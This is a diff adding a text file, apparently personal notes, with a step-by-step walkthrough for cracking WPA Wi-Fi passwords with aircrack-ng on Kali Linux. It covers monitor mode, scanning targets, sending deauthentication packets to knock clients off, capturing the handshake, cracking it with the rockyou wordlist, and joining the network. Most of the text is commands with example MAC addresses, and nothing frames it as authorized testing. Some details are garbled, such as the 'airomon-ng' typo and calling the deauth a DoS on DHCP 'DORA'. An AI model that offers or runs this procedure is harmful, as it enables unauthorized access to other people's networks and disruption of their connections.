@@ -1,0 +1,162 @@
+step1 : 
+
+At first let’s know the version of Kali-Linux and OS version running in VMware:
+1.cat /etc/os-release
+2. uname -a
+
+step2 : 
+
+Next let’s know the network adapter (pen drive) is working on Linux or not and connected or not by the following command: 
+1.iwconfig
+2.ifconfig
+
+Which shows the info of networks running on the device, the network manager. 
+
+step 3:
+
+airmon-ng
+this is use to check our Wi-Fi port details
+
+Start monitor mode by the commands: 
+iwconfig 
+&&
+sudo airmon-ng start wlan0 
+&&
+sudo airomon-ng check kill ( to kill networkmanager)
+
+step 4: 
+
+Verify that monitor mode is used:
+
+sudo airmon-ng 
+     &
+You could also use: 
+iwconfig (to check that interface is in monitor mode)
+
+Step 5:
+
+Get the AP's MAC address and channel
+this is used to capture all nearby ssid + bssid + channel id
+AP-MAC & channel - you need to select your own here.
+
+airodump-ng wlan0mon
+
+Step 6:
+
+Getting the bssid lets target the focused bssid by following commands. 
+
+airodump-ng wlan0 –bssid [bssid]
+
+step 7:
+
+To get the handshake and other data to store in a file, so keep in a file name as: 
+
+airodump-ng wlan0 --bssid [bssid] –write test
+
+ (Any file name as own; I used here test as file name).
+
+step 8:
+
+
+-----DOS   FOR BREAKING OF DORA --- (Discover-Offer-Request-Acknowledge) ----
+
+aireplay-ng –0 2 –a [router bssid] –c [client bssid] wlan0mon
+                                  or
+aireplay-ng deauth 7 -a [router bssid] wlan0mon/wlan0
+
+
+step 9:
+
+1.	aircrack-ng -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
+                                                       or
+2.	aircrack-ng -n[router bssid] -w /home/kali/rockyou.txt test-01.cap
+
+
+! Crack file with Rock you or another wordlist.
+                     &
+! Make sure you have rockyou in text format (unzip file on Kali) and move to Desktop.
+
+step 10:
+
+we need to restart the network manager by following commands: 
+
+sudo systemctl start NetworkManager
+              &&
+sudo systemctl restart NetworkManager
+
+Now eject the adapter and connect it again to work it as normal
+
+
+
+step 11:
+
+copy paste the keyphrase or passphrase or password from the terminal we got in the wifi network.
+
+
+step 12:
+
+As, if it not connected then its wrong but when we got connected to the router then we successfully
+connected to the router and get the access to the wifi network.
+                               
+
+                                   In a simple steps: 
+
+airmon-ng
+this is use to check our wifi port details
+
+
+
+airmon-ng start wlan0
+this is use to change mode  managed to monitor
+
+kill pids
+
+
+airodump-ng  wlan0mon
+
+this is use To capture all nearby ssid + bssid + channe id 
+
+
+
+airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface] wlan0mon 
+
+eg:
+airodump-ng -c 1 --bssid DE:67:F1:F6:F0:58  -w /root/Desktop/ wlan0mon
+
+
+-----dos FOR BREAKING OF dora----
+
+
+
+aireplay-ng –0 2 –a [router bssid] –c [client bssid] wlan0mon
+eg:-
+
+aireplay-ng --deauth  0 –a 00:14:BF:E0:E8:D5 –c 4C:EB:42:59:DE:31 wlan0mon
+
+The –0 is a short cut for the deauth mode and the 2 is the number of deauth packets to send.
+-a indicates the access point/router’s BSSID, replace [router bssid] with the BSSID of the target network, which in my case, is 00:14:BF:E0:E8:D5.
+-c indicates the client’s BSSID, the device we’re trying to deauth, noted in the previous picture. Replace the [client bssid] with the BSSID of the connected client, this will be listed under “STATION.”
+And of course, mon0 merely means the monitor interface, change it if yours is different
+
+aircrack-ng  -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
+
+-a is the method aircrack will use to crack the handshake, 2=WPA method.
+-b stands for bssid, replace [router bssid] with the BSSID of the target router, mine is 00:14:BF:E0:E8:D5.
+-w stands for wordlist, replace [path to wordlist] with the path to a wordlist that you have downloaded. I have a wordlist called “wpa.txt” in the root folder.
+/root/Desktop/*.cap
+
+
+
+Successfully access to the wifi network :-).....
+
+
+
+
+
+
+
+
+
+
+
+
